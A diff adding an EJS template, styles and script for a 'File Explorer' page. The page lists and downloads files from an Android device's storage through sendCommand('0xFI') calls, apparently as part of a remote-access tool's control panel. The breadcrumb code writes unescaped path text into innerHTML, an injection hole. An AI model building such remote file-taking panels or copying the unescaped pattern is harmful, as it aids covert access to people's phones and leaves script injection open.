@@ -1,0 +1,937 @@
+<div class="ui segment filemanager-page">
+
+    <!-- ============================================
+         TOP ACTION BAR
+         ============================================ -->
+    <div class="fm-toolbar">
+        <div class="fm-toolbar-left">
+            <div class="fm-title">
+                <i class="icon folder open"></i>
+                <span>File Explorer</span>
+                <span class="fm-count" id="fmCount">
+                    <i class="icon circle notch"></i>
+                    <%= pageData.length %>
+                </span>
+            </div>
+            <div class="fm-search-wrap">
+                <i class="icon search"></i>
+                <input type="text" id="fmSearch" placeholder="Search files..." autocomplete="off">
+            </div>
+        </div>
+
+        <div class="fm-toolbar-right">
+            <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button fm-home-btn dlop">
+                <i class="icon home"></i>
+                <span>Home</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- ============================================
+         BREADCRUMB (if folder path known)
+         ============================================ -->
+    <div class="fm-breadcrumb" id="fmBreadcrumb" style="display: none;">
+        <i class="icon sitemap"></i>
+        <div class="fm-breadcrumb-path" id="fmBreadcrumbPath"></div>
+    </div>
+
+    <!-- ============================================
+         FILE LIST
+         ============================================ -->
+    <div class="fm-list-wrap">
+        <table class="ui celled table fm-table">
+            <thead>
+                <tr>
+                    <th colspan="2">Files</th>
+                </tr>
+            </thead>
+            <tbody id="fmTbody">
+                <% pageData.forEach((item) => {
+                    let fileName = item.name || '';
+                    let isDir = !!item.isDir;
+                    let ext = '';
+                    if (!isDir) {
+                        let dotIdx = fileName.lastIndexOf('.');
+                        if (dotIdx > -1 && dotIdx < fileName.length - 1) {
+                            ext = fileName.substring(dotIdx + 1).toLowerCase();
+                        }
+                    }
+
+                    // Icon + hue for files
+                    let fileIcon = 'file outline';
+                    let hue = 200;
+                    if (isDir) {
+                        fileIcon = 'folder';
+                        hue = 45; // amber
+                    } else if (['jpg','jpeg','png','gif','webp','bmp','svg','heic'].includes(ext)) {
+                        fileIcon = 'file image outline'; hue = 280;
+                    } else if (['mp4','mov','avi','mkv','webm','flv','wmv'].includes(ext)) {
+                        fileIcon = 'file video outline'; hue = 330;
+                    } else if (['mp3','wav','ogg','m4a','flac','aac'].includes(ext)) {
+                        fileIcon = 'file audio outline'; hue = 20;
+                    } else if (['pdf'].includes(ext)) {
+                        fileIcon = 'file pdf outline'; hue = 0;
+                    } else if (['doc','docx','txt','rtf','odt'].includes(ext)) {
+                        fileIcon = 'file word outline'; hue = 210;
+                    } else if (['xls','xlsx','csv','ods'].includes(ext)) {
+                        fileIcon = 'file excel outline'; hue = 140;
+                    } else if (['zip','rar','7z','tar','gz','bz2'].includes(ext)) {
+                        fileIcon = 'file archive outline'; hue = 40;
+                    } else if (['apk'].includes(ext)) {
+                        fileIcon = 'android icon'; hue = 130;
+                    } else if (['json','xml','js','html','css','py','sh','java','kt'].includes(ext)) {
+                        fileIcon = 'file code outline'; hue = 180;
+                    }
+                %>
+                <tr class="fm-row <%= isDir ? 'fm-dir' : 'fm-file' %>" data-path="<%= item.path %>">
+                    <td data-label="Name" title="<%= item.path %>">
+                        <div class="fm-item">
+                            <div class="fm-icon" style="--hue: <%= hue %>;">
+                                <i class="icon <%= fileIcon %>"></i>
+                            </div>
+                            <div class="fm-info">
+                                <span class="fm-name" title="<%= fileName %>"><%= fileName %></span>
+                                <% if (ext && !isDir) { %>
+                                <span class="fm-ext"><%= ext.toUpperCase() %></span>
+                                <% } %>
+                                <% if (isDir) { %>
+                                <span class="fm-type">Folder</span>
+                                <% } %>
+                            </div>
+                        </div>
+                    </td>
+                    <td class="collapsing" data-label="Action">
+                        <% if (!isDir) { %>
+                        <button class="ui button dlop fm-action-btn fm-download"
+                                onclick="downloadFile(this, '<%= item.path %>')"
+                                title="Download file">
+                            <i class="icon download"></i>
+                            <span>Download</span>
+                        </button>
+                        <% } else { %>
+                        <button class="ui button dlop fm-action-btn fm-open"
+                                onclick="openDirectory(this, '<%= item.path %>')"
+                                title="Open folder">
+                            <i class="icon folder open"></i>
+                            <span>Open</span>
+                        </button>
+                        <% } %>
+                    </td>
+                </tr>
+                <% }) %>
+            </tbody>
+        </table>
+
+        <!-- Empty state -->
+        <% if (pageData.length === 0) { %>
+        <div class="fm-empty">
+            <i class="icon folder open outline"></i>
+            <p>This folder is empty</p>
+        </div>
+        <% } %>
+
+        <div class="fm-empty" id="fmEmptySearch" style="display: none;">
+            <i class="icon search"></i>
+            <p>No files match your search</p>
+        </div>
+    </div>
+
+</div>
+
+<style type="text/css">
+    /* ============================================
+       FILE MANAGER — Dark Neon Theme
+       ============================================ */
+
+    .ui.segment.filemanager-page {
+        background: rgba(19, 26, 38, 0.75) !important;
+        backdrop-filter: blur(16px);
+        -webkit-backdrop-filter: blur(16px);
+        border: 1px solid rgba(0, 217, 255, 0.15) !important;
+        border-radius: 20px !important;
+        box-shadow:
+            0 20px 60px rgba(0, 0, 0, 0.5),
+            0 0 0 1px rgba(255, 255, 255, 0.03),
+            inset 0 1px 0 rgba(255, 255, 255, 0.06) !important;
+        padding: 22px !important;
+    }
+
+    /* ============================================
+       TOOLBAR
+       ============================================ */
+    .fm-toolbar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        gap: 16px;
+        flex-wrap: wrap;
+        padding-bottom: 18px;
+        margin-bottom: 8px;
+        border-bottom: 1px solid rgba(0, 217, 255, 0.12);
+    }
+
+    .fm-toolbar-left {
+        display: flex;
+        align-items: center;
+        gap: 16px;
+        flex: 1;
+        min-width: 0;
+        flex-wrap: wrap;
+    }
+
+    .fm-toolbar-right {
+        flex-shrink: 0;
+    }
+
+    /* Title */
+    .fm-title {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 1rem;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 1.5px;
+        color: #e6edf3;
+        white-space: nowrap;
+    }
+
+    .fm-title .icon.folder.open {
+        color: #00d9ff !important;
+        margin: 0 !important;
+        font-size: 1.15rem;
+        filter: drop-shadow(0 0 8px rgba(0, 217, 255, 0.5));
+    }
+
+    .fm-count {
+        display: inline-flex;
+        align-items: center;
+        gap: 5px;
+        background: rgba(0, 217, 255, 0.12);
+        border: 1px solid rgba(0, 217, 255, 0.3);
+        color: #00d9ff !important;
+        font-size: 0.72rem !important;
+        font-weight: 700;
+        padding: 3px 9px;
+        border-radius: 20px;
+        letter-spacing: 0.5px;
+        box-shadow: 0 0 12px rgba(0, 217, 255, 0.15);
+        animation: countPulse 3s ease-in-out infinite;
+    }
+
+    .fm-count .icon {
+        font-size: 0.65rem !important;
+        filter: none !important;
+        animation: spin 4s linear infinite;
+    }
+
+    @keyframes countPulse {
+        0%, 100% { box-shadow: 0 0 12px rgba(0, 217, 255, 0.15); }
+        50%      { box-shadow: 0 0 20px rgba(0, 217, 255, 0.35); }
+    }
+
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    /* Search */
+    .fm-search-wrap {
+        position: relative;
+        flex: 1;
+        max-width: 320px;
+        min-width: 180px;
+    }
+
+    .fm-search-wrap .icon.search {
+        position: absolute;
+        left: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #5a6675 !important;
+        font-size: 0.9rem !important;
+        margin: 0 !important;
+        pointer-events: none;
+        transition: color 0.2s ease;
+    }
+
+    .fm-search-wrap input {
+        width: 100%;
+        background: rgba(10, 14, 23, 0.7) !important;
+        border: 1px solid #223047 !important;
+        border-radius: 10px !important;
+        color: #e6edf3 !important;
+        padding: 10px 14px 10px 36px !important;
+        font-size: 0.88rem !important;
+        font-family: inherit !important;
+        outline: none !important;
+        transition: all 0.2s ease;
+        box-sizing: border-box;
+        -webkit-appearance: none;
+        appearance: none;
+    }
+
+    .fm-search-wrap input:focus {
+        border-color: #00d9ff !important;
+        box-shadow: 0 0 0 3px rgba(0, 217, 255, 0.15) !important;
+        background: rgba(10, 14, 23, 0.95) !important;
+    }
+
+    .fm-search-wrap:focus-within .icon.search {
+        color: #00d9ff !important;
+    }
+
+    .fm-search-wrap input::placeholder {
+        color: #5a6675 !important;
+    }
+
+    /* Home button */
+    .ui.blue.button.fm-home-btn {
+        background: linear-gradient(135deg, #00d9ff 0%, #7c3aed 100%) !important;
+        border: none !important;
+        border-radius: 10px !important;
+        color: #fff !important;
+        font-weight: 700 !important;
+        font-size: 0.82rem !important;
+        letter-spacing: 1px;
+        text-transform: uppercase;
+        padding: 11px 20px !important;
+        min-height: 42px;
+        transition: all 0.25s ease !important;
+        box-shadow: 0 0 20px rgba(0, 217, 255, 0.3) !important;
+        cursor: pointer;
+        position: relative;
+        overflow: hidden;
+        white-space: nowrap;
+        display: inline-flex !important;
+        align-items: center;
+        gap: 8px;
+    }
+
+    .ui.blue.button.fm-home-btn::after {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.25), transparent);
+        transition: left 0.6s ease;
+    }
+
+    .ui.blue.button.fm-home-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 35px rgba(0, 217, 255, 0.55) !important;
+    }
+
+    .ui.blue.button.fm-home-btn:hover::after {
+        left: 100%;
+    }
+
+    .ui.blue.button.fm-home-btn .icon {
+        margin: 0 !important;
+    }
+
+    /* Home button when loading (existing JS adds .loading) */
+    .ui.blue.button.fm-home-btn.loading {
+        pointer-events: none;
+    }
+
+    .ui.blue.button.fm-home-btn.loading .icon {
+        animation: spin 1s linear infinite;
+    }
+
+    /* ============================================
+       BREADCRUMB
+       ============================================ */
+    .fm-breadcrumb {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding: 10px 14px;
+        background: rgba(10, 14, 23, 0.5);
+        border: 1px solid rgba(34, 48, 71, 0.6);
+        border-radius: 10px;
+        margin-bottom: 14px;
+        font-size: 0.82rem;
+        overflow-x: auto;
+        white-space: nowrap;
+        scrollbar-width: none;
+    }
+
+    .fm-breadcrumb::-webkit-scrollbar { display: none; }
+
+    .fm-breadcrumb .icon.sitemap {
+        color: #7c3aed !important;
+        margin: 0 !important;
+        flex-shrink: 0;
+    }
+
+    .fm-breadcrumb-path {
+        color: #8b98a8;
+        font-family: 'JetBrains Mono', 'Courier New', monospace;
+        font-size: 0.78rem;
+    }
+
+    .fm-breadcrumb-path .crumb-seg {
+        color: #00d9ff;
+    }
+
+    .fm-breadcrumb-path .crumb-sep {
+        color: #5a6675;
+        margin: 0 4px;
+    }
+
+    /* ============================================
+       TABLE
+       ============================================ */
+    .fm-list-wrap {
+        overflow-x: auto;
+        -webkit-overflow-scrolling: touch;
+        border-radius: 14px;
+        border: 1px solid rgba(34, 48, 71, 0.6);
+    }
+
+    table.ui.celled.table.fm-table {
+        background: transparent !important;
+        border: none !important;
+        border-radius: 0 !important;
+        overflow: visible !important;
+        border-collapse: separate;
+        border-spacing: 0;
+        width: 100%;
+        margin: 0 !important;
+    }
+
+    table.ui.celled.table.fm-table thead {
+        position: sticky;
+        top: 0;
+        z-index: 3;
+    }
+
+    table.ui.celled.table.fm-table thead th {
+        background: rgba(10, 14, 23, 0.95) !important;
+        backdrop-filter: blur(10px);
+        color: #00d9ff !important;
+        font-size: 0.72rem !important;
+        font-weight: 700 !important;
+        text-transform: uppercase;
+        letter-spacing: 1.2px;
+        padding: 14px 18px !important;
+        border-bottom: 1px solid rgba(0, 217, 255, 0.2) !important;
+        border-left: none !important;
+        text-align: left;
+        white-space: nowrap;
+    }
+
+    table.ui.celled.table.fm-table tbody td {
+        padding: 12px 18px !important;
+        border-top: 1px solid rgba(34, 48, 71, 0.4) !important;
+        border-left: none !important;
+        color: #e6edf3 !important;
+        font-size: 0.88rem;
+        vertical-align: middle;
+        word-break: break-word;
+    }
+
+    /* Row animation */
+    table.ui.celled.table.fm-table tbody tr.fm-row {
+        transition: background 0.2s ease;
+        animation: rowIn 0.3s ease backwards;
+    }
+
+    table.ui.celled.table.fm-table tbody tr.fm-row:nth-child(1)  { animation-delay: 0.00s; }
+    table.ui.celled.table.fm-table tbody tr.fm-row:nth-child(2)  { animation-delay: 0.02s; }
+    table.ui.celled.table.fm-table tbody tr.fm-row:nth-child(3)  { animation-delay: 0.04s; }
+    table.ui.celled.table.fm-table tbody tr.fm-row:nth-child(4)  { animation-delay: 0.06s; }
+    table.ui.celled.table.fm-table tbody tr.fm-row:nth-child(5)  { animation-delay: 0.08s; }
+    table.ui.celled.table.fm-table tbody tr.fm-row:nth-child(6)  { animation-delay: 0.10s; }
+    table.ui.celled.table.fm-table tbody tr.fm-row:nth-child(7)  { animation-delay: 0.12s; }
+    table.ui.celled.table.fm-table tbody tr.fm-row:nth-child(8)  { animation-delay: 0.14s; }
+    table.ui.celled.table.fm-table tbody tr.fm-row:nth-child(9)  { animation-delay: 0.16s; }
+    table.ui.celled.table.fm-table tbody tr.fm-row:nth-child(10) { animation-delay: 0.18s; }
+    table.ui.celled.table.fm-table tbody tr.fm-row:nth-child(n+11) { animation-delay: 0.2s; }
+
+    @keyframes rowIn {
+        from { opacity: 0; transform: translateX(-6px); }
+        to   { opacity: 1; transform: translateX(0); }
+    }
+
+    table.ui.celled.table.fm-table tbody tr.fm-row:hover {
+        background: rgba(0, 217, 255, 0.06) !important;
+    }
+
+    /* Folder rows get slightly distinct accent */
+    table.ui.celled.table.fm-table tbody tr.fm-row.fm-dir:hover {
+        background: rgba(255, 176, 32, 0.06) !important;
+    }
+
+    /* File item cell */
+    .fm-item {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        min-width: 0;
+    }
+
+    .fm-icon {
+        width: 42px;
+        height: 42px;
+        border-radius: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+        background: linear-gradient(
+            135deg,
+            hsla(var(--hue, 200), 70%, 55%, 0.15) 0%,
+            hsla(var(--hue, 200), 70%, 45%, 0.08) 100%
+        );
+        border: 1px solid hsla(var(--hue, 200), 70%, 55%, 0.35);
+        box-shadow: 0 0 15px hsla(var(--hue, 200), 80%, 55%, 0.15);
+        transition: all 0.25s ease;
+    }
+
+    .fm-icon .icon {
+        margin: 0 !important;
+        font-size: 1.1rem !important;
+        color: hsl(var(--hue, 200), 80%, 65%) !important;
+        filter: drop-shadow(0 0 6px hsla(var(--hue, 200), 80%, 55%, 0.5));
+    }
+
+    tr.fm-row:hover .fm-icon {
+        transform: scale(1.08);
+        box-shadow: 0 0 22px hsla(var(--hue, 200), 90%, 60%, 0.35);
+    }
+
+    /* Info */
+    .fm-info {
+        display: flex;
+        flex-direction: column;
+        gap: 3px;
+        min-width: 0;
+        flex: 1;
+    }
+
+    .fm-name {
+        font-weight: 600;
+        color: #e6edf3;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+        transition: color 0.2s ease;
+    }
+
+    tr.fm-row:hover .fm-name {
+        color: #fff;
+    }
+
+    .fm-ext,
+    .fm-type {
+        display: inline-block;
+        font-family: 'JetBrains Mono', monospace;
+        font-size: 0.62rem;
+        font-weight: 700;
+        letter-spacing: 1px;
+        padding: 1px 6px;
+        border-radius: 4px;
+        align-self: flex-start;
+        text-transform: uppercase;
+    }
+
+    .fm-ext {
+        color: #8b98a8;
+        background: rgba(10, 14, 23, 0.6);
+        border: 1px solid rgba(34, 48, 71, 0.6);
+    }
+
+    .fm-type {
+        color: #ffb020;
+        background: rgba(255, 176, 32, 0.08);
+        border: 1px solid rgba(255, 176, 32, 0.25);
+    }
+
+    /* ============================================
+       ACTION BUTTONS
+       ============================================ */
+    .fm-action-btn.ui.button {
+        background: rgba(10, 14, 23, 0.7) !important;
+        border: 1px solid rgba(34, 48, 71, 0.8) !important;
+        border-radius: 8px !important;
+        color: #8b98a8 !important;
+        font-weight: 600 !important;
+        font-size: 0.72rem !important;
+        text-transform: uppercase;
+        letter-spacing: 0.8px;
+        padding: 8px 14px !important;
+        min-height: 36px;
+        cursor: pointer;
+        transition: all 0.2s ease !important;
+        white-space: nowrap;
+        display: inline-flex !important;
+        align-items: center;
+        gap: 6px;
+        box-shadow: none !important;
+    }
+
+    .fm-action-btn.ui.button .icon {
+        margin: 0 !important;
+        font-size: 0.8rem;
+        transition: all 0.2s ease;
+    }
+
+    .fm-action-btn.ui.button:hover {
+        transform: translateY(-1px);
+    }
+
+    /* Open (folder) button — amber */
+    .fm-action-btn.ui.button.fm-open:hover {
+        background: rgba(255, 176, 32, 0.1) !important;
+        border-color: rgba(255, 176, 32, 0.5) !important;
+        color: #ffb020 !important;
+        box-shadow: 0 0 15px rgba(255, 176, 32, 0.25) !important;
+    }
+
+    .fm-action-btn.ui.button.fm-open:hover .icon {
+        filter: drop-shadow(0 0 6px rgba(255, 176, 32, 0.6));
+    }
+
+    /* Download (file) button — cyan */
+    .fm-action-btn.ui.button.fm-download:hover {
+        background: rgba(0, 217, 255, 0.1) !important;
+        border-color: rgba(0, 217, 255, 0.5) !important;
+        color: #00d9ff !important;
+        box-shadow: 0 0 15px rgba(0, 217, 255, 0.25) !important;
+    }
+
+    .fm-action-btn.ui.button.fm-download:hover .icon {
+        filter: drop-shadow(0 0 6px rgba(0, 217, 255, 0.6));
+        animation: downloadBounce 0.5s ease;
+    }
+
+    @keyframes downloadBounce {
+        0%, 100% { transform: translateY(0); }
+        40%      { transform: translateY(2px); }
+    }
+
+    /* Loading state (existing JS adds .loading, we make it work with our style) */
+    .fm-action-btn.ui.button.loading {
+        pointer-events: none;
+    }
+
+    .fm-action-btn.ui.button.loading::before {
+        display: none !important; /* Hide Semantic's default loader pseudo */
+    }
+
+    .fm-action-btn.ui.button.loading .icon {
+        animation: spin 1s linear infinite;
+    }
+
+    /* Disabled state (existing JS adds .disabled) */
+    .fm-action-btn.ui.button.disabled {
+        opacity: 0.4 !important;
+        pointer-events: none;
+    }
+
+    /* ============================================
+       EMPTY STATES
+       ============================================ */
+    .fm-empty {
+        padding: 40px 20px;
+        text-align: center;
+        color: #5a6675;
+        border-top: 1px solid rgba(34, 48, 71, 0.4);
+    }
+
+    .fm-empty .icon {
+        font-size: 2.5rem !important;
+        margin: 0 0 12px 0 !important;
+        opacity: 0.4;
+        display: block;
+    }
+
+    .fm-empty p {
+        margin: 0;
+        font-size: 0.88rem;
+        letter-spacing: 0.5px;
+    }
+
+    /* ============================================
+       MOBILE — Table → Cards
+       ============================================ */
+    @media (max-width: 768px) {
+        .ui.segment.filemanager-page {
+            padding: 16px 12px !important;
+            border-radius: 16px !important;
+        }
+
+        .fm-toolbar {
+            flex-direction: column;
+            align-items: stretch;
+            gap: 12px;
+            padding-bottom: 14px;
+        }
+
+        .fm-toolbar-left {
+            flex-direction: column;
+            align-items: stretch;
+            gap: 10px;
+            width: 100%;
+        }
+
+        .fm-toolbar-right {
+            width: 100%;
+        }
+
+        .fm-title {
+            font-size: 0.9rem;
+            letter-spacing: 1.2px;
+        }
+
+        .fm-search-wrap {
+            max-width: 100%;
+            width: 100%;
+        }
+
+        .ui.blue.button.fm-home-btn {
+            width: 100%;
+            justify-content: center;
+            padding: 12px !important;
+        }
+
+        /* Table becomes cards */
+        .fm-list-wrap {
+            border: none;
+            overflow: visible;
+        }
+
+        table.ui.celled.table.fm-table {
+            display: block;
+            border: none !important;
+        }
+
+        table.ui.celled.table.fm-table thead {
+            display: none;
+        }
+
+        table.ui.celled.table.fm-table tbody {
+            display: block;
+        }
+
+        table.ui.celled.table.fm-table tbody tr.fm-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(10, 14, 23, 0.6) !important;
+            border: 1px solid rgba(34, 48, 71, 0.7) !important;
+            border-radius: 12px !important;
+            padding: 12px 14px !important;
+            margin-bottom: 10px !important;
+            animation: none;
+        }
+
+        /* Folder rows — amber tint */
+        table.ui.celled.table.fm-table tbody tr.fm-row.fm-dir {
+            border-left: 3px solid rgba(255, 176, 32, 0.6) !important;
+        }
+
+        /* File rows — cyan tint */
+        table.ui.celled.table.fm-table tbody tr.fm-row.fm-file {
+            border-left: 3px solid rgba(0, 217, 255, 0.5) !important;
+        }
+
+        table.ui.celled.table.fm-table tbody tr.fm-row:hover {
+            border-color: rgba(0, 217, 255, 0.4) !important;
+        }
+
+        table.ui.celled.table.fm-table tbody td {
+            display: block !important;
+            padding: 0 !important;
+            border: none !important;
+            background: transparent !important;
+        }
+
+        table.ui.celled.table.fm-table tbody td:first-child {
+            flex: 1;
+            min-width: 0;
+        }
+
+        table.ui.celled.table.fm-table tbody td:last-child {
+            flex-shrink: 0;
+        }
+
+        .fm-icon {
+            width: 40px;
+            height: 40px;
+        }
+
+        .fm-name {
+            font-size: 0.9rem;
+            white-space: normal;
+            word-break: break-word;
+        }
+
+        /* Action button becomes compact icon-only */
+        .fm-action-btn.ui.button {
+            padding: 10px 12px !important;
+            min-height: 40px;
+            min-width: 40px;
+        }
+
+        .fm-action-btn.ui.button span {
+            display: none;
+        }
+
+        .fm-action-btn.ui.button .icon {
+            font-size: 0.95rem !important;
+        }
+    }
+
+    /* Small phones */
+    @media (max-width: 400px) {
+        .fm-title { font-size: 0.8rem; }
+        .fm-title .icon { font-size: 1rem; }
+        .fm-count { font-size: 0.65rem !important; }
+        .fm-icon { width: 36px; height: 36px; }
+        .fm-icon .icon { font-size: 0.95rem !important; }
+        .fm-name { font-size: 0.82rem; }
+    }
+
+    /* Reduced motion */
+    @media (prefers-reduced-motion: reduce) {
+        table.ui.celled.table.fm-table tbody tr.fm-row {
+            animation: none !important;
+        }
+        .fm-count {
+            animation: none !important;
+        }
+        tr.fm-row:hover .fm-icon {
+            transform: none;
+        }
+    }
+</style>
+
+<script>
+    /* ============================================
+       Original functions — UNCHANGED
+       ============================================ */
+    function openDirectory(element, path) {
+        $(element).children().css("opacity", "0");
+        $(element).addClass('blue');
+        $(element).addClass('loading');
+        $('.dlop').addClass('disabled');
+        sendCommand('0xFI', {
+            action: 'ls',
+            path
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                    $(element).children().css("opacity", "1");
+                    $(element).removeClass('blue');
+                    $('.dlop').removeClass('loading')
+                }, 300)
+            } else {
+                if (message === 'Requested') {
+                    showNotification('#2ecc71', 'Requesting Files, Please Wait');
+                    setTimeout(() => {
+                        location.reload();
+                    }, 500)
+                }
+            }
+        })
+    }
+
+    function downloadFile(element, path) {
+        $(element).children().css("opacity", "0");
+        $(element).addClass('green');
+        $(element).addClass('loading');
+        $('.dlop').addClass('disabled');
+        sendCommand('0xFI', {
+            action: 'dl',
+            path
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                    $(element).children().css("opacity", "1");
+                    $(element).removeClass('green');
+                    $('.dlop').removeClass('disabled')
+                }, 300)
+            } else {
+                if (message === 'Requested') {
+                    setTimeout(() => {
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('green');
+                        $(element).removeClass('loading');
+                        $('.dlop').removeClass('disabled')
+                        showNotification('#2ecc71', 'Downloading File, It will be avaliable in `Downloads` Soon');
+                    }, 300)
+                }
+            }
+        })
+    }
+
+    /* ============================================
+       New: live search + breadcrumb display
+       ============================================ */
+    (function () {
+        /* -------- Live search filter -------- */
+        var searchInput = document.getElementById('fmSearch');
+        var tbody = document.getElementById('fmTbody');
+        var emptySearch = document.getElementById('fmEmptySearch');
+        var countBadge = document.getElementById('fmCount');
+
+        if (searchInput && tbody) {
+            searchInput.addEventListener('input', function () {
+                var q = this.value.toLowerCase().trim();
+                var rows = tbody.querySelectorAll('tr.fm-row');
+                var visible = 0;
+
+                rows.forEach(function (row) {
+                    var text = row.textContent.toLowerCase();
+                    if (!q || text.indexOf(q) !== -1) {
+                        row.style.display = '';
+                        visible++;
+                    } else {
+                        row.style.display = 'none';
+                    }
+                });
+
+                if (emptySearch) {
+                    emptySearch.style.display = (visible === 0 && rows.length > 0) ? 'block' : 'none';
+                }
+
+                if (countBadge) {
+                    var icon = countBadge.querySelector('i.icon');
+                    var iconHTML = icon ? icon.outerHTML : '';
+                    countBadge.innerHTML = iconHTML + ' ' + visible;
+                }
+            });
+        }
+
+        /* -------- Breadcrumb (from first item's path) --------
+           We derive the parent path from the first row's data-path
+           attribute — works with the existing server data. */
+        var firstRow = tbody ? tbody.querySelector('tr.fm-row') : null;
+        var breadcrumb = document.getElementById('fmBreadcrumb');
+        var breadcrumbPath = document.getElementById('fmBreadcrumbPath');
+
+        if (firstRow && breadcrumb && breadcrumbPath) {
+            var samplePath = firstRow.getAttribute('data-path') || '';
+            // Parent folder = everything before last "/"
+            var lastSlash = samplePath.lastIndexOf('/');
+            if (lastSlash > 0) {
+                var parentPath = samplePath.substring(0, lastSlash);
+                // Split into segments and render
+                var segments = parentPath.split('/').filter(function (s) { return s.length > 0; });
+                var html = '<span class="crumb-seg">/</span>';
+                segments.forEach(function (seg, idx) {
+                    html += '<span class="crumb-seg">' + seg + '</span>';
+                    if (idx < segments.length - 1) html += '<span class="crumb-sep">/</span>';
+                });
+                breadcrumbPath.innerHTML = html;
+                breadcrumb.style.display = 'flex';
+            }
+        }
+    })();
+</script>
